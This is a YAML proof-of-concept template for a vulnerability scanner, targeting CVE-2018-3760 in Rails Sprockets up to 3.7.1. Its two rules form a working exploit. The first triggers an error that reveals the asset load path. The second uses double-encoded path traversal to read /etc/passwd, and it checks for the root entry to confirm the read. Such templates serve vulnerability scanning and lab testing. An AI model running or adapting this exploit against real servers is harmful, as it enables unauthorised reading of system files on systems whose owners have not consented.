detail:
  Affected Version: Sprockets<=3.7.1
  author: leezp
  links:
  - https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760
expression: r0() && r1()
manual: true
name: poc-yaml-rails-cve-2018-3760-rce
rules:
  r0:
    expression: response.status == 500 && response.body.bcontains(b"FileOutsidePaths")
    output:
      path: search["path"]
      search: '"/etc/passwd is no longer under a load path: (?P<path>.*?),".bsubmatch(response.body)'
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /assets/file:%2f%2f/etc/passwd
  r1:
    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
transport: http
